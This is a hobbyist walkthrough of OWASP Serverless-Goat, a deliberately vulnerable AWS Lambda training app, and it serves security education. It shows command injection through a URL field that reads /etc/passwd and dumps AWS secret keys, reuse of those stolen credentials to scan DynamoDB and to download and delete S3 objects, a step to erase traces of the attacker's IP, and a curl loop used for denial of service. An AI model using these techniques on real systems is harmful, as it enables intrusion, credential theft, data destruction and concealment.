# serverless-goat Walkthrough
written by MetalMandalore   

Original OWASP written documentation on serverless-goat can be found here:  
http://github.com/OWASP/Serverless-Goat   
After being inspired by the essentially free training for a serverless lambda function I created this walkthrough.    

**Note this requires the setup of a free-tier Amazon AWS account**   
During my usage of serverless-goat I encountered 0 charges to my free-tier Amazon AWS account, however; small charges could be encurred anytime Amazon AWS is used. Just a forewarning since my understanding of Amazon AWS is still relatively small, there's a lot to that beasty.  

## Installation 
1. Access the AWS Serverless Application Repository   
https://serverlessrepo.aws.amazon.com/applications/arn:aws:serverlessrepo:us-east-1:761130837472:applications~serverless-goat
2. Click Deploy
3. Scroll down and click Deploy   
This may take a few minutes.    
For the purpose of this training, it's kind of *cheating* to note the **Permissions** and **Resources** during the 1st time through, but the **Readme file** should be read.
To improve application security it is important to take note of the configured permissions before deployment and ensure least privileges are being followed. It is also a great idea to review the following post deployment for verification:  
    * Permissions
      * SAM policy templates
      * Capabilities
    * Resources
    * Readme File  
      

## Lambda Function API
To Locate the Endpoint URL
1. Navigate to Services > CloudFormation
2. Select the Stack name serverless-repo-serverless-goat
3. Select the Outputs tab & copy the URL listed
4. Navigate to URL in a separate browser  
The endpoint loads an OWASP ServerlessGoat page containing a form consisting of 
      * a single user input textbox and submit button  
      * a list of potential vulnerabilities  
5. Click Submit with the currrent value in place  
This loads a A Poison Tree poem with a URL that seems remarkably close to an s3 bucket address  
**Save this URL For Later, or scroll down to (###S3 Bucket Access with No Credentials) to see it's use now**

## Information Gathering
1. Click back on the browser to return to the main page 
2. Attempt **Function Data Injection** by adding code to the end of the URL  
*e.g. try adding*`; pwd`
3. Click submit to load the original poem as well as **Improper Exception Handling and Verbose Error**  
  *this appears to be vulnerable to __Function Data Injection__*
### Improved injection attempts
1. Click back and change the URL form to a URL that doesn't contain a doc file followed by a snippet of code  
e.g. `https://inject; pwd`  
2. Click submit to load the current working directory */var/task*   
while this is **Function Data Injection** it is also **Serverless Function Execution Flow Manipulation** since no applications should contain server-side code injections as part of their functions   
3. Repeat this tasks with the following bash code additions for more information resulting from **Over-Privileged Function Permissions**  
**Document everything for later**    
`https://inject; whoami`
   *Current user should be sbx-user0666 or similar*   
`https://inject; ls -la`
   *Lists the current directory (index.js + node_modules subdirectory)*   
`https://inject; cat /etc/passwd` 
   *Lists current users*  
`https://inject; cat index.js`
   *Provides code for basic information on how this page functions*   
   Important information to be gathered from this file includes:
      * Database 
      * S3 bucket Put permissions
      * node.js package used 
      * Table information 
      * Permissions to curl (potentially) 
      * Output URL 
 4. Explore file contents  
 `https://inject; cat node_modules/.bin/uuid`   
 USAGE: `uuid [ver] [options]` + some encryption math used to generate keys  
 This doesn't seem to be entirely random
 5. Read more javascript
  `https://inject; cat node_modules/node-uuid/package.json`  
  *lists package version*  
  Research into this version of UUID results in a known vulnerability to insecure randomness  
  **TL:DR;** math.random can produce predictable values and this in an **Insecure 3rd Party Dependency**  
  keys generated and for storage in the s3 bucket may be predicted  
  This could be *very* interesting if it was used to store PII, due to the potential s3 bucket enumeration  
  Since these buckets can already be easily discovered, and do not contain PII, it isn't really interesting  
 6. Check for unsecured environmental variables  
 `https://inject; env`  
 Results in **Insecure Application Secrets Storage**: 
       * aws_session_token
       * aws_secret_access_key
       * aws_access_key
       * table name
       * s3 bucket name

### S3 Bucket Access with No Credentials
1. Explore the bucket address by opening a new tab, and copying/pasting the URL in the old tab with modifications  
    * URL Modifications for the 2nd tab:  
      - remove the last portion of the URI (e.g. /a3243c-321c-9d21-342f3ebc2a09)  
      - change the s3-website-us-east-1.amazonaws.com to be a correct bucket address (s3.amazonaws.com)
2. Now that the URL modifications have been made, load the s3 bucket  
This site contains information concerning the s3 bucket contents, and each Key listed can be added to the URL as a path  
This site does has a **Broken Authentication** vulnerability because it does not require any authorization for access  
This site also contains the **Insecure Serverless Deployment Configuration** vulerability for the following reasons
      * The s3 bucket URL should not be easy to infer
      * This page should be secured and encrypted instead of being publicly accessible 
Return to the previous tab

### Enumeration
#### Node.js Access Enumeration
Attempt to access content/information using Node.js  
1. What version of node.js?  
`https://enum; node -e 'const AWS = require(\"aws-sdk\"); (async () => {console.log("Running Node.js" + process.version))})();'`   
This is typcially the way to verify that Node.js was successfully installed  
This should **not** be accessible to end users and falls under **Improper Exception Handling and Verbose Error**
2. Can the database be scanned?  
`https://enum; node -e 'const AWS = require(\"aws-sdk\"); (async () => {console.log(await new AWS.DynamoDB.DocumentClient().scan({TableName: process.env.TABLE_NAME}).promise());})();'`  
This is **Over-Privileged Function Permissions & Roles**
3. Potential further questions to be answered by node.js if you're a guru:  
    * Can the database be queried?
    * Does GetItem work?
    * Does PutItem work?
    * Does UpdateItem work?
    * Can the s3 buckets be scanned?

#### Profile Enumeration
1. Using the information found in the env variables create a user profile 
`aws configure --profile user666`  
    * aws_secret_access_key    
    * aws_access_key   
    * us-east-1
2. Add the aws_session_token to the end of the user profile configuration by editing the *~/.aws/credentials* file  
`vim ~/.aws/credentials`  
`aws_session_token = <aws_session_token>`
3. Obtain current profile information 
`aws sts get-caller-identity --profile user666`  
**Improper Exception Handling and Verbose Errors**

#### Database Actions Enumeration
1. Attempt to scan the database contents with AWS CLI  
`aws dynamodb scan --table-name <table-name> --profile user666`
2. Additional database commands to attempt:
    * Describe-table
    * Query the database
    * Attempt to GetItem
    * Attempt to DeleteItem
    * Attempt to UpdateItem
    * Attempt to BatchWriteItem
    * Attempt to BatchGetItem
 
#### S3 Bucket Actions Enumeration
1. Attempt ListBucket
`aws s3 ls <s3-bucket> --profile user` 
2. Attempt to download bucket contents  
`aws s3 sync s3://<s3-bucket> . --profile user`
3. Review downloaded bucket content  
`ls -la`
4. Display commands run via Lambda Function
`cat <key>`
5. Attempt to delete bucket contents  
`aws s3api delete-object --bucket <s3-bucket> --key <key> --profile`
6. Remove all traces of requests by your IP address by repeated step 5 for each key value found  
7. Additional S3 actions to attempt:  
   * GetBucketLocation
   * Attempt GetLifecycleConfiguration
   * Attempt PutLifecycleConfiguration
   * Attempt GetObject
   * Attempt GetObjectAcl
   * Attempt GetObjectVersion
   * Attempt PutObject
   * Attempt PutObjectAcl

### DoS Attack
Create a simple bash script to curl the site multiple times   
This will demonstrate the serverless function going from reachable to unreachable  
*internal server errors* are proof of a successful DoS Attack
1. Start with the http address after a function is sent  
(https://<x>.execute-api.us-east-1.amazonaws.com/Prod/api/convert?document_url=)
2. Copy the address between brackets, URL encode it, and then add to the end of the address 
3. Repeat Step 2 5x for the <http-address> value, which will perform the DoS
4. The run the following bash script  
``` bash
for i in {1.100}; do  
  echo $i  
  curl -L <http-address>  
done
```

## Removing Serverless-goat
1. Login to the AWS Console
2. Navigate to Services
3. Navigate to Cloudformation
4. Click on the name of the Stack link
5. Click Delete
5. Click Delete Stack

### If Delete Fails
You may retain resources that are failing to delete
1. Click Delete
2. Select Bucket as the resource to retain
3. Click Delete Stack
4. Navigate to Services 
5. Navigate to S3
6. Select the S3 bucket 
7. Empty the bucket
8. Select and delete the bucket


